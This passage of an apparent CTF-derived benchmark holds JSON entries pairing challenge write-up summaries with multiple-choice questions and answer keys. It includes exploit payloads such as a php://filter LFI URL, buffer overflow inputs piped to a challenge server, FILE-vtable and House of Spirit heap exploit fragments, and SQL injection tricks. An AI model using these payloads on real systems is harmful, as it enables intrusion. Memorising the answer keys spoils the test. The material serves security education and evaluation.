            "In a challenge involving Local File Inclusion (LFI), PHP wrappers can be used to bypass limitations and retrieve source code of PHP files. This can be particularly useful in web challenges where direct access to the source code is restricted. A payload to use PHP filters for base64 encoding can be constructed as follows: `http://target/endpoint/?page=php://filter/read=convert.base64-encode/resource=filename`",
            "In challenges where cryptographic operations such as XOR are used in conjunction with hash functions to generate secret values, understanding the cryptographic operation and the hash function's behavior can enable the recovery of secret keys or salts. If the operation involves XORing a known hash (like an MD5 hash of a user-controlled value) with an unknown salt to create a directory or file name, one can reverse the process by XORing the known value with the result to recover the secret salt. This process requires creating a user or inputting a controlled value, observing the output (such as a directory name), and then applying XOR with the known hashed value to uncover the salt. A Python snippet demonstrating this technique:\n\n```python\nimport hashlib\n\ndef xor_strings(xs, ys):\n    return \"\".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))\n\nusername = \"known_username\"\nknown_dir_hex = \"resulting_directory_hex\"\nsalt_hex = xor_strings(hashlib.md5(username).hexdigest(), known_dir_hex)\nprint(\"Recovered salt in hex:\", salt_hex)\n```"
        ],
        "question": [
            "In the context of a web challenge aiming to retrieve PHP file source codes without direct access, which payload correctly demonstrates the use of a PHP wrapper to encode the content in base64 format before it's displayed? - A. `http://targetsite.com/?file=../../../../etc/passwd` - B. `http://targetsite.com/?file={{{system('ls')}}}` - C. `http://targetsite.com/?page=php://filter/convert.base64-encode/resource=config` - D. `http://targetsite.com/?page=php://filter/read=convert.base64-encode/resource=index` ",
            "When trying to uncover a secret salt used in a cryptographic operation where a user name is hashed and then XORed with the salt to generate a directory name, which Python snippet correctly demonstrates the process of recovering the salt if you have the directory name (as hex) and the user name? - A. ```python import hashlib def recover_salt(directory_name_hex, username): hashed_username = hashlib.sha256(username.encode()).hexdigest() salt = ''.join(chr(int(directory_name_hex[i:i+2], 16) ^ ord(hashed_username[i])) for i in range(0, len(directory_name_hex), 2)) print(\"Recovered salt:\", salt) ```  - B. ```python import hashlib def xor_strings(xs, ys): return \"\".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys)) username = \"user\" directory_name_hex = \"dir_name_in_hex\" salt_hex = xor_strings(hashlib.md5(username).hexdigest(), directory_name_hex) print(\"Recovered salt in hex:\", salt_hex) ```  - C. ```python import hashlib username = \"admin\" known_hash = hashlib.md5(username.encode('utf-8')).digest() directory_name_hex = \"directory_in_hex\" salt = known_hash ^ bytes.fromhex(directory_name_hex) print(\"Salt:\", salt.hex()) ```  - D. ```python import binascii username = \"example\" directory_name = binascii.unhexlify(\"example_hex_directory_name\") salt = ''.join(chr(ord(c)^42) for c in username) print(\"Predicted salt:\", salt) ``` "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "EZDSA",
        "write_up": "dataset/raw/EZDSA.md",
        "type": "crypto",
        "competition": [
            "CyberSecurityRumble/2020",
            "https://ctftime.org/event/1057/tasks/"
        ],
        "score": 200,
        "max_score": 1337,
        "difficulty": 0.14958863126402394,
        "knowledge": [
            "In a challenge involving ECDSA signature generation with a custom entropy function, if the entropy function is not truly random (e.g., a fixed or predictable value is used for the \"random\" `k` every time), the same `r` value will be produced for different messages. This vulnerability allows an attacker to deduce the constant `k` by observing repeated signatures and applying the ECDSA signature equation. Specifically, `k` can be calculated using the equation `k = (H(m1) - H(m2)) / (s1 - s2)`, where `H(m)` is the hash of the message `m` and `s` is the signature component of `(r, s)` for that message. This method relies on obtaining two signatures `(m1, r, s1)` and `(m2, r, s2)` for different messages `m1` and `m2`.",
            "Given the ability to indirectly deduce or calculate the nonce `k` used in the ECDSA signing process due to non-random or predictable entropy sources, it is viable to recover the private key from the signatures. The private key `d` can be calculated once `k` is known, using signatures `(r, s)` and message hashes `H(m)`, through the equation `x = (k*s - H(m)) / r`, which must be solved for `x` (representative of the private key material in some contexts). This method allows for signing arbitrary messages as if they were signed with the original private key, thus enabling spoofing of signatures for messages that were never actually signed by the legitimate key holder.\n\nSample Python snippet for calculating `k`:\n```python\nfrom ecdsa.numbertheory import inverse_mod\n\n# Assuming curve.order is the order of the curve being used, and variables are defined\nr_i = inverse_mod(r, curve.order)\nm_h_diff = (m_hash1 - m_hash2) % curve.order\n\nk = (m_h_diff * inverse_mod((sig1 - sig2), curve.order)) % curve.order\n```\n\nSample Python snippet for recovering the private key `d`:\n```python\ns_E = (((((sig1 * k) % curve.order) - m_hash1) % curve.order) * r_i) % curve.order\n```\nThese snippets illustrate the processes for first determining `k` and then exploiting it to compute values directly related to the private key, enabling further cryptographic operations as if in possession of the private key itself."
        ],
        "question": [
            "In a cybersecurity scenario where the entropy for ECDSA signature generation is not truly random and results in the constant value of `r` for different messages, how would you calculate the nonce `k` used during the ECDSA signing process if two different messages `m1` and `m2` give you the signatures `(r, s1)` and `(r, s2)` respectively? - A. `k = (s1 - s2) / (H(m1) + H(m2))` - B. `k = (H(m1) - H(m2)) * (s1 + s2)` - C. `k = (H(m1) - H(m2)) / (s1 - s2)` - D. `k = (H(m1) + H(m2)) * (s1 - s2)`",
            "In the context of ECDSA signatures with the nonce `k` deduced due to predictable entropy sources, which equation would be used to recover the private key `d` from a signature `(r, s)` and the hash of the message `H(m)`? - A. `d = (s*r - H(m)) / k` - B. `d = (k*s + H(m)) * r` - C. `d = (s - H(m)) / (k*r)` - D. `d = (k*s - H(m)) / r`"
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "ezpwn",
        "write_up": "dataset/raw/ezpwn.md",
        "type": "pwn",
        "competition": [
            "RITSEC/2018",
            "https://ctftime.org/event/682/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "In buffer overflow challenges, analyzing the difference between the base pointer offsets of the variable to be overwritten and the buffer can guide in calculating the exact payload length required to overflow the variable's value. For example, if the difference in offsets is 24 bytes, the payload will need 24 \"A\"s to reach the target variable's memory location. Example payload for local exploitation: `python -c \"print 'A'*24 + 'BBBB' \"`. The \"BBBB\" can be replaced with the desired value to overwrite the target variable based on the little-endian format.",
            "When exploiting buffer overflow vulnerabilities remotely, factors such as different operating environments may require adjustments in the payload size. Initial assumptions based on local exploitation may need to be revised. In this context, if local exploitation requires a 24-byte buffer to reach the target variable but remote exploitation seems ineffective, increasing the buffer size systematically can identify the correct buffer length needed for successful exploitation. Example payload for remote exploitation: `python -c \"print 'A'*28 + '\\x01\\x00\\x00\\x00'\" | nc fun.ritsec.club 8001`. This shows that while locally 24 \"A\"s were sufficient, remotely, the buffer size changed to 28 \"A\"s to effectively overwrite the target variable."
        ],
        "question": [
            "Given the context of analyzing a binary's buffer overflow vulnerability using GDB, and observing that the base pointer offsets between a variable `x` and the input buffer are `rbp-0x8` and `rbp-0x20` respectively, how would you calculate the exact length of the payload needed to overflow `x` with the value `\\x01\\x00\\x00\\x00`? - A. Add 8 bytes to the difference between `rbp-0x8` and `rbp-0x20` to account for the buffer's base address. - B. Subtract the two offsets directly and use the result as the payload size. - C. Use the difference between `rbp-0x8` and `rbp-0x20`, which equals 24 bytes, as the exact payload length before the overflow value. - D. Divide the difference in offsets by 2 to adjust for 32-bit architecture. ",
            "In an environment where a buffer overflow vulnerability's local exploitation differs from its remote exploitation in terms of the required buffer length to overwrite a variable, what approach should be taken to accurately determine the effective payload size for remote exploitation? - A. Multiply the locally determined buffer size by 2 to accommodate network delays. - B. Reduce the initial buffer size by 4 bytes to adjust for potential remote environment optimizations. - C. Systematically increase the buffer size used locally until the remote exploitation achieves the desired effect, indicating a need to adjust the initial buffer length assumption. - D. Keep the buffer size the same but change the overflow value's endianness for remote exploitation. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "ezrev",
        "write_up": "dataset/raw/ezrev.md",
        "type": "reverse",
        "competition": [
            "Hayyim/2022",
            "https://ctftime.org/event/1553/tasks/"
        ],
        "score": 139,
        "max_score": 500,
        "difficulty": 0.278,
        "knowledge": [
            "When analyzing binaries for vulnerabilities or hidden values in a CTF challenge, patching binary instructions can forcefully manipulate program flow to assist in revealing sensitive information. Specifically, in scenarios where a binary performs checks before displaying a hidden string, altering register assignments and replacing subsequent instructions with `nop` (no operation) up to the point of a print function call can be effective. This method ensures that the hidden string is directly loaded into the correct register for output without being altered or checked. In the context provided, changing the instruction to load `target_string` into the `rdi` register instead of `rsi` and patching instructions between this load and the `puts` function call with `nop` can reveal the encoded flag. Example adjusted instruction: `48 8D 3D D9 26 00 00  lea rdi, target_string`.",
            "For challenges involving encoding or encryption routines implemented in software, reverse engineering the algorithm and reimplementing it can decode or decrypt the hidden message. When the encoding algorithm uses XOR operations with known values and possibly swapping certain bits around based on a pattern, a reverse script can be constructed to apply the inverse of those operations. This approach requires analyzing the algorithm to understand the transformations applied to the input string, then coding a script that reverses these steps. In scenarios involving XOR with specific values and conditional transformations based on index positions, as shown by the reimplementation of the binary encoding in Python to reveal the flag, constructing a reverse script that iteratively applies the inverse operations (e.g., subtracting where there was addition, performing XOR with the same values, and reversing any bit swaps) will successfully decode the message. Example Python snippet for reversing XOR and swap operations:\n\n```python\na = [coded_integers]  # Array of integers representing encoded message.\n\n# Reverse transformation logic goes here, typically involving loops and conditionals.\nfor i in range(len(a)):\n    # Apply inverse operations based on original algorithm's logic.\n    # E.g., if original operation was a XOR with fixed value, reapply same XOR.\n\n# Decode and print out the original message from the transformed array.\nfor i in range(len(a)):\n    print(chr(a[i]), end=\"\")\n```"
        ],
        "question": [
            "When working with binary patching to manipulate program flow and reveal sensitive information, such as modifying instruction registers and using `nop` operations up to a print function, which of the following represents the appropriate way to modify the register to direct output to `puts` without any alteration? - A. Change the opcode to reflect `lea rsi, target_string` and fill subsequent bytes with `0xFF` to ensure execution paths lead to `puts`. - B. Alter the instruction `48 8D 35 D9 26 00 00 lea rsi, target_string` to `48 8D 3D D9 26 00 00`, changing the register to `rdi` and use `nop` operations to nullify intervening instructions. - C. Replace all instances of `lea` and `call` with `nop` operations following the initial instruction modification to redirect the execution. - D. Directly change all `call` instructions to `jmp` to bypass unnecessary code and force output through `puts`.",
            "For reverse engineering challenges that involve decoding or decrypting information where the algorithm involves XOR operations and possibly bit swapping, what is the correct approach to constructing a reverse script that decodes the hidden message? - A. Reimplement the encryption algorithm as-is in a high-level programming language like Python, then run the encoded message through it to get the plaintext. - B. Analyze the binary or code to identify the encryption steps and then write a script that applies these steps in reverse order, including undoing any XOR operations with the same values and reversing bit swaps or additions/subtractions as necessary. - C. Convert the binary to assembly, then manually undo each operation in reverse order, writing down the plaintext as each character is decoded. - D. Create a brute force script that tries every possible combination of bit swaps and XOR operations until the correct plaintext message is revealed."
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Fake Registration",
        "write_up": "dataset/raw/Fake Registration.md",
        "type": "web",
        "competition": [
            "TMUCTF/2021",
            "https://ctftime.org/event/1427/tasks/"
        ],
        "score": 432,
        "max_score": 500,
        "difficulty": 0.864,
        "knowledge": [
            "For SQL injection challenges, especially when dealing with input length restrictions, commenting out the value separator allows for extending the effective length of the injection payload. This technique doubles the available space for the injection, enabling more complex queries within restricted environments.\n\nExample payload fragment:  \n```\nusername=a',(first part of subquery here/*  \npassword=*/second part of subquery here))--\n```",
            "In blind SQL injection scenarios where direct error messages or boolean conditions are not available, utilizing constraints errors (like null constraints on columns) can facilitate the extraction of data such as passwords. This method relies on triggering constraint violations to infer the presence or absence of specific conditions or values.\n\nExample logic for constructing a payload:  \nGenerate a unique username each attempt to bypass the checks and use a subquery to compare character by character of the target data (e.g., admin password). If a constraint violation (here, a non-empty password) is triggered, it indicates a successful match for the current character guess, allowing character-by-character brute-forcing of the target data."
        ],
        "question": [
            "In a scenario where a SQL injection vulnerability is present and you have to deal with input length restrictions, which of the following techniques would be most effective to bypass this restriction and inject a longer payload? - A. Increasing the payload size using Base64 encoding - B. Commenting out values separator to effectively double the available injection space - C. Using URL encoding to shrink the payload size - D. Splitting the payload into multiple requests and concatenate at the server side",
            "When exploiting a blind SQL injection vulnerability without direct error messages or boolean conditions, which technique can be used to extract data like passwords by leveraging database constraints? - A. Injecting time delays and observing the response time to infer the presence of specific characters - B. Utilizing UNION SELECT statements to infer the structure of the database - C. Employing constraint violations (e.g., null constraints) to infer the success or failure of each character guess - D. Crafting payloads that generate verbose error messages to reveal data"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "fakev",
        "write_up": "dataset/raw/fakev.md",
        "type": "pwn",
        "competition": [
            "m0leCon/2020/Quals",
            "https://ctftime.org/event/1025/tasks/"
        ],
        "score": -1,
        "max_score": 449,
        "difficulty": -1,
        "knowledge": [
            "In a challenge involving file handling and linked list manipulation, leveraging Use-After-Free (UAF) vulnerabilities enables reading from previously closed file descriptors. This can expose sensitive data left in memory, such as libc addresses, which are critical for bypassing ASLR in exploitation scenarios. This tactic is particularly effective when coupled with heap manipulations, like filling up `tcache` bins to control the memory layout and read contents of freed chunks.",
            "For challenges that allow controlling file structures within an application, it's possible to hijack the application's control flow by carefully crafting a fake file structure and manipulating function pointers. This involves understanding and exploiting the internal structure of file objects in libc, such as overriding the vtable pointer to point to a controlled location with malicious code or function pointers. By doing this, one can execute arbitrary code, such as spawning a shell, when the application performs operations on the fake file object. This method requires precise control over heap layout and knowledge of libc internals, including bypassing checks like `_IO_vtable_check` by placing the fake vtable in legitimate sections of libc.\n\nSample of payload to manipulate file structures and execute arbitrary code:\n```python\nfake_file = ''  \nfake_file += p64(0x2000)        # flags  \nfake_file += p64(0)             # _IO_read_ptr  \nfake_file += p64(0)             # _IO_read_end  \n...\nfake_file += p64(0)  \nfake_file += p64(0x602108) # file  \nfake_file += p64(0)        # next  \n...\nfake_file += p64(vtable-0x3a8-0x88) # vtable  \nfake_file += p64(system)            # alloc_buffer\n```"
        ],
        "question": [
            "In a scenario dealing with Use-After-Free vulnerabilities related to file handling, which strategy can effectively leverage such vulnerabilities to expose sensitive data, thereby assisting in ASM mitigation? - A. Allocating new files until memory allocation fails, causing a denial of service that reveals memory addresses. - B. Writing to closed file descriptors to corrupt memory and cause the application to crash, revealing memory layouts. - C. Filling up `tcache` bins and using UAF to read from freed memory chunks, potentially leaking libc addresses useful for bypassing ASLR. - D. Using buffer overflow on open file descriptors to overwrite adjacent memory structures and leak stack pointers directly. ",
            "In exploiting challenges that involve manipulation of file structures, what critical step should be taken to execute arbitrary code via a fake file object? - A. Changing the file descriptor's read/write permissions to bypass OS-level security mechanisms, allowing for unrestricted access to execute any code. - B. Crafting a fake file structure with a manipulated vtable pointer to point to malicious code or function pointers, enabling arbitrary code execution when operations are performed on the fake file. - C. Encrypting the contents of a file structure to force the application to execute a decryption routine that inadvertently runs injected shellcode. - D. Modifying the file's metadata to represent a larger size than is actually allocated, causing buffer overflows that lead to arbitrary code execution when the file is read or closed. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Faking till you're Making",
        "write_up": "dataset/raw/Faking till you're Making.md",
        "type": "The type of this CTF challenge is **pwn**.",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 486,
        "max_score": 1000,
        "difficulty": 0.486,
        "knowledge": [
            "In challenges involving heap exploitation where the program exhibits control over heap data and executes a free operation on a pointer arithmetic result (e.g., `free(data + 2)`), one can leverage the House of Spirits technique. This technique exploits the vulnerability by freeing a crafted fake chunk to control the tcache list. Such manipulation allows for the redirection of the program's execution flow to attacker-controlled code, like a win function in this scenario. A crucial step in employing the House of Spirits technique is crafting a fake chunk with an appropriate size field to match the allocation request, ensuring it is inserted into the tcache list for the targeted size class (e.g., aligning the fake chunk size with an upcoming `malloc` size, including metadata overhead).\n\nSample payload for crafting a fake chunk and triggering the vulnerability:\n```python\nfake_chunk1 = p64(0) + p64(0x40) + 6*p64(0)  # Creates fake chunk with size 0x40 to insert into tcache of size 0x40.\n# Subsequent operations would include sending this fake chunk followed by exploiting the buffer overflow to overwrite the return address with the address of the win function.\n```",
            "In exploit scenarios where a buffer overflow is present in conjunction with a custom allocation pattern that leads to a controlled `malloc` call, one can overwrite critical program control data to hijack the program's execution flow. Typically, this involves taking advantage of inputs to overflow buffers and overwrite return addresses or function pointers. In the provided write-up, the overflow into `__s` from `fgets` is used to overwrite adjacent heap memory or stack data (based on the memory layout and specifics of the overflow), allowing for an arbitrary code execution vulnerability by redirecting execution to the `sh` function that spawns a shell.\n\nSample method to exploit buffer overflow for redirection of execution flow:\n```python\n# Assuming the address of the win function (sh) is known and the overflow allows for overwriting a return address\npayload = b\"A\"*offset + p64(addr_sh)\n# 'offset' is the number of bytes required to reach the return address from the start of the buffer '__s'\n# 'addr_sh' is the address of the 'sh' function that grants shell access\n```\n**Note:** Replace `addr_sh` with the actual address of the `sh` function as leaked or discovered through analysis. The exact payload structure depends on the specifics of the buffer overflow vulnerability, such as the size of the overflowable buffer and the memory layout."
        ],
        "question": [
            "In the context of heap exploitation, specifically using the House of Spirits technique, what is the significance of crafting a fake chunk with the size field set to `0x40` including the PREV_INUSE bit cleared (set to 0)? - A. It aligns the fake chunk with the memory layout for efficient code execution. - B. It ensures the fake chunk is placed in the fastbins for fast allocation. - C. It tricks glibc into treating it as a valid chunk for free and reuse, aligning with a `malloc(0x30)` request considering the headers. - D. It secures the chunk against being merged with adjacent free chunks by the glibc malloc consolidation. ",
            "Considering a scenario where an attacker can influence heap content and there's a buffer overflow vulnerability allowing overflow into adjacent heap memory or stack data, how would an attacker typically redirect the program's execution to a specific function like `sh()` that spawns a shell? - A. By sending large amounts of data to fill up the heap and force an overflow into the program's code segment. - B. By crafting a payload that fills the buffer up to the control data and overwrites a return address with the address of `sh()`. - C. Changing environment variables to point to the desired function when an overflow occurs. - D. By manipulating the program's execution threads to concurrently access the heap and cause a race condition. "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Farm",
        "write_up": "dataset/raw/Farm.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 41,
        "max_score": 477,
        "difficulty": 0.0859538784067086,
        "knowledge": [
            "When given an encryption algorithm that involves mathematical operations in a finite field, such as Galois Field ($GF(64)$) in this case, the resulting key from operations (such as multiplication) within this field will still be an element of the field. This significantly reduces the key space and makes brute-forcing feasible if the field size is small. In scenarios where encryption keys are derived from products or other operations within a small finite field, one can brute-force the key by iterating over all elements in the field rather than considering the seemingly larger initial key space.",
            "To decrypt messages that were encrypted using operations in a Galois Field and combined with other operations like base64 encodings, one must reverse each step in the encryption process. This involves:\n      - Iterating over possible keys in the field.\n      - Applying the inverse operations in the correct order, which could typically involve base64 decoding after reversing any mathematical operations done with the key.\n      - Catching exceptions during decryption attempts to skip invalid computations or key guesses that do not result in valid encoding schemes or base64 decodable content.\n    \n    Example payload for decryption driven by brute-forcing over a field of size 64:\n    ```python\n    for possible_key in GF(64):  \n       try:  \n           # Attempt to decrypt with this key\n           plaintext = decrypt_function(encrypted_message, possible_key)  \n           if b\"expected_content\" in plaintext:  \n               print(plaintext.decode())  \n       except:  \n           # Skip invalid keys\n           continue\n    ```"
        ],
        "question": [
            "In a cryptographic challenge involving a custom encryption scheme, the key is generated by taking the product of 14 random elements from the Galois Field \\(GF(64)\\). What implication does the use of \\(GF(64)\\) for the key generation have on the process of key discovery?  - A. The use of \\(GF(64)\\) means that the key must be a complex number, making brute-forcing impractical due to the infinite possibilities. - B. Because the key is the product of elements from \\(GF(64)\\), the resulting key space is exactly 64, making it possible to brute-force the key by trying all field elements. - C. The keyspace expands exponentially with each product taken in \\(GF(64)\\), resulting in a keyspace too large to brute-force. - D. Generating a key from \\(GF(64)\\) requires a quantum computer to successfully brute-force due to the cryptographic strength of Galois Fields. ",
            "Given an encryption method that employs mathematical operations in \\(GF(64)\\) followed by base64 encoding, which step is essential for decrypting the encrypted messages as part of brute-forcing the key?  - A. Transforming each character of the encoded message directly to ASCII values before applying the guessed keys. - B. Utilizing complex number arithmetic to approximate the inverse operations during the decryption attempts. - C. Iterating over all possible keys within \\(GF(64)\\), reversing the mathematical operations with the key, and finally attempting base64 decoding to check for the presence of expected content. - D. Encrypting the cipher text with each possible key in \\(GF(64)\\) again and comparing the result to a dictionary of potential plain texts. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Fast Calculator",
        "write_up": "dataset/raw/Fast Calculator.md",
        "type": "The type of challenge described in the write-up is a **reverse** challenge.",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When handling IEEE-754 special values in program logic, especially in checks for negative values, NaN (Not a Number), and infinity, it is essential to account for edge cases like `-0.0`, which is considered negative but is not less than `0.0`. This can lead to logic errors if not handled correctly. In C, the `signbit()` function can be used to detect if a floating-point number, including `-0.0`, is negative. This is particularly useful in scenarios where the output of mathematical operations influences program flow or outcomes such as in decryption algorithms.\n   - Example code snippet to detect if a value is negative, including `-0.0`: `if (signbit(input)) {/* Handle negative, including -0.0 */}`",
            "To ensure accurate handling of Nan and infinity in mathematical operations or program logic, `isnan()` and `isinf()` functions from the math library should be utilized. This is crucial in programs relying on floating-point calculations to make decisions, such as bit manipulation based on the result of calculations. Implementing these checks prevents potentially skipping over necessary operations or incorrectly processing values, which is critical in solving CTF challenges that involve manipulating or decrypting data based on specific calculation outcomes.\n   - Example condition to check if the result of an operation should cause a bit flip based on being NaN, infinity, or negative:\n     ```c\n     int will_flip(double input) {\n       if (signbit(input)) return 1;  // Checks for negative including -0.0\n       if (isnan(input)) return 1;    // Checks if input is NaN\n       if (isinf(input)) return 1;    // Checks if input is infinity\n       return 0;\n     }\n     ```"
        ],
        "question": [
            "In a challenge scenario where deciphering a flag depends on correct handling of IEEE-754 special values in C, a particular challenge involves an incorrect function that fails to recognize `-0.0` as a negative value, potentially causing logic errors in flag decryption. Which of the following functions correctly detects if a floating-point number, including `-0.0`, is negative, thereby ensuring correct logic flow in such decryption algorithms? - A. `if (input < 0.0) {/* Negative */}` - B. `if (input <= 0.0) {/* Possibly Negative */}` - C. `if (signbit(input)) {/* Negative including -0.0 */}` - D. `if (fabs(input) == 0.0 && input < 0.0) {/* Negative */}` ",
            "During a cryptographic challenge, a programmer needs to ensure that calculations influencing the decryption process accurately handle Not a Number (NaN) and infinity outcomes. Mismanagement of these special cases can derail the decryption. Which of the following function implementations correctly checks for NaN, infinity, or negative values and can be used to decide whether a calculation result should trigger a bit flip in the decryption process? - A. `int should_flip(double result) { return result < 0; }` - B. `int should_flip(double result) { return isnan(result) || isinf(result); }` - C. `int should_flip(double result) { if (result == NAN) return 1; else return 0; }` - D. `int will_flip(double input) { if (signbit(input)) return 1; if (isnan(input)) return 1; if (isinf(input)) return 1; return 0; }` "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Federation Workflow System",
        "write_up": "dataset/raw/Federation Workflow System.md",
        "type": "crypto",
        "competition": [
            "CTFZone/2018/Quals",
            "https://ctftime.org/event/632/tasks/"
        ],
        "score": 119,
        "max_score": 500,
        "difficulty": 0.238,
        "knowledge": [
            "When exploiting AES-ECB encryption vulnerabilities, if the application prepends a controllable input to a secret value before encryption, you can leverage this to decrypt the secret one byte at a time. This technique relies on the ECB mode's property of deterministic encryption for identical plaintext blocks. You craft inputs such that the block boundary aligns just before the start of the secret, then brute-force each byte of the secret by comparing the encrypted block against all possible byte values. This method requires you to control the preceding text to align block boundaries as needed and predict the length of secret data to set correct recovery blocks in your code.",
            "If a file path traversal vulnerability exists in an application, it's possible to access files outside of the intended directory by including '../' sequences in the file path. This can be particularly useful for accessing configuration files or secrets that are stored outside the web root or in parent directories not directly accessible through the application. This technique allows for the bypassing of rudimentary path sanitization measures that do not account for such directory traversal sequences."
        ],
        "question": [
            "In the context of exploiting deterministic encryption in AES-ECB mode, consider you have a scenario where you can control the prefix of the plaintext before a secret suffix. You know that the encryption function uses AES-ECB and there's a secret value directly following your controlled input. Which of the following strategies correctly outlines the approach to decrypt the secret one byte at a time?  - A. Encrypting a sequence of inputs with varying last bytes and comparing these against a known suffix block to identify the secret. - B. Sending a long string of a single repeating character to absorb the secret into a new block entirely then bruteforcing the entire block at once. - C. Brute-forcing the encryption key directly by trying every possible key until the secret is decrypted. - D. Setting up an identical encryption service locally and using it to generate potential secrets until one matches the output of the target service. ",
            "When dealing with a file path traversal vulnerability in an application that relies on insufficient sanitization checks, which of the following payloads would most effectively exploit this vulnerability to access a hypothetical `totp.secret` file that resides two directories above the current working directory, considering the application removes sequences after a null byte and attempts to prevent access outside of a specified directory?  - A. Sending the payload `../../totp.secret` to directly navigate up two directories and access the file. - B. Utilizing a loop of directory changes to confuse the application\u2019s path tracking, thus gaining unauthorized access. - C. Encrypting the directory traversal payload to bypass any plaintext detection mechanisms the application might employ. - D. Crafting payloads that use encoded or obfuscated directory traversal sequences to bypass input validation. "
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "Feed_me",
        "write_up": "dataset/raw/Feed_me.md",
        "type": "This write-up corresponds to a reverse challenge.",
        "competition": [
            "Pragyan/2019",
            "https://ctftime.org/event/755/tasks/"
        ],
        "score": 150,
        "max_score": 400,
        "difficulty": 0.375,
        "knowledge": [
            "When analyzing C programs, especially in CTF challenges for understanding vulnerabilities like buffer overflow, decompiling the executable with tools such as Ghidra can significantly simplify the analysis process. This approach allows seeing the program's logic in a more readable format, making it easier to identify conditions to exploit or understand how data is manipulated.",
            "If a program uses scanf (or similar functions) to read into sequentially declared character arrays without proper bounds checking, it is possible to perform a buffer overflow attack. This vulnerability can be exploited by crafting an input that exceeds the target buffer size, allowing the attacker to overwrite adjacent memory locations. In situations where these memory locations are used to store critical variables (such as condition checks for releasing a flag), carefully structured inputs can manipulate these variables to achieve unintended outcomes, such as bypassing security checks or obtaining unauthorized access to information.  \n   - Example payload to exploit such buffer overflow and manipulate adjacent variables: `-0000065580000005028-000009404` where the payload's structure aims to overwrite multiple adjacent variables by filling beyond the buffer size and controlling the overflow into adjacent variable memory spaces."
        ],
        "question": [
            "When decompiling an executable file for a buffer overflow challenge using a tool like Ghidra, what is the primary advantage of this approach? - A. Simplifies the analysis process by converting the code into a high-level language. - B. Automatically patches vulnerabilities in the executable file. - C. Increases the execution speed of the C program. - D. Encrypts the decompiled code for secure analysis. ",
            "In a CTF challenge, given a situation where the program uses `scanf` to read input into sequentially declared character arrays `x`, `y`, and `z` without proper bounds checking, which technique would most likely be successful in causing a buffer overflow to manipulate adjacent variable values? - A. Using a short input to avoid memory allocation. - B. Crafting an input that exceeds the target buffer size and strategically fills the overflow into adjacent variable spaces. - C. Encrypting the input to bypass memory checks. - D. Repeating a single character to fill the buffer space without overflow. "
        ],
        "answer": [
            "A. Simplifies the analysis process by converting the code into a high-level language.",
            "B. Crafting an input that exceeds the target buffer size and strategically fills the overflow into adjacent variable spaces."
        ]
    },
    {
        "name": "Ferman",
        "write_up": "dataset/raw/Ferman.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 134,
        "max_score": 477,
        "difficulty": 0.2809224318658281,
        "knowledge": [
            "In RSA challenges where additional information is provided that links prime factors \\(p\\) and \\(q\\) with a certain formula, one can factorize a derived number using its unique properties, like being a perfect power (e.g., seventh power of a number). This approach can be particularly useful when direct factorization of the RSA modulus \\(n\\) is impractical due to its size. Factors found in such a unique manner can then be used to compute \\(p\\) and \\(q\\).",
            "If the challenge involves complex numbers or operations that are not solvable in the real number domain, transform the problem into the complex number domain (\\(\\mathbb{Z}[i]\\)), where \\(i\\) is the imaginary unit. Factoring in the complex domain, specifically Gaussian integers for equations involving \\(x^2 + y^2\\), can provide prime factors when the RSA modulus \\(n\\) is composed of primes that relate to complex-number-based equations. This method is especially effective when the problem includes equations of the form \\(x^2 + y^2 = z^t\\) where \\(t\\) is an integer.\n\nSample Python code snippet demonstrating factorization and prime extraction:\n```python\nfrom sympy.ntheory import isprime\n\n# Assuming w is the integer derived from the challenge\nw = 24007015341450638047707811509679207068051724063799752621201994109462561550079479155110637624506028551099549192036601169213196430196182069103932872524092047760624845002308713558682251660517182097667675473038586407097498167776645896369165963981698265040400341878755056463554861788991872633206414266159558715922583613630387512303492920597052611976890648632123534922756985895479931541478630417251021677032459939450624439421018438357005854556082128718286537575550378203702362524442461229\n\na, b = 2265, 902\nz = w ** (1/7)\n\n# Factor z in the Gaussian integer domain\ngaussian_factors = factor(ZZ[i](z))\n\n# Find the divisors that correspond to p and q\n# (Simplified example, actual calculations would involve iterating through factors)\nz_test = (-1236649975237776943493190425869173*I - 3575914522629734831030006136433790)*(4*I + 5)\nx_test, y_test = abs(z_test.real), abs(z_test.imag)\n\np, q = x_test + a, y_test + b\n\nassert is_prime(p) and is_prime(q)\n```\nThis code snippet demonstrates the conceptual approach to using complex factorization and adjusting with given offsets \\(a\\) and \\(b\\) to find \\(p\\) and \\(q\\)."
        ],
        "question": [
            "In an RSA cryptographic scenario where direct factorization of the modulus \\(n\\) is challenging, and additional mathematical information ties the prime factors together by the equation \\((p - a)^2 + (q - b)^2 = w\\) which eventually leads to a perfect power of a derived number \\(z = w^{1/t}\\), what unique property of \\(z\\) is exploited to facilitate the factorization process? - A. \\(z\\) is a prime number that simplifies the RSA algorithm. - B. \\(z\\) representing a perfect seventh power of a number, aiding in its factorization in the complex domain. - C. \\(z\\) is always an even number, making it trivial to factorize. - D. \\(z\\) being a simple sum of \\(p\\) and \\(q\\), directly giving away the prime factors. ",
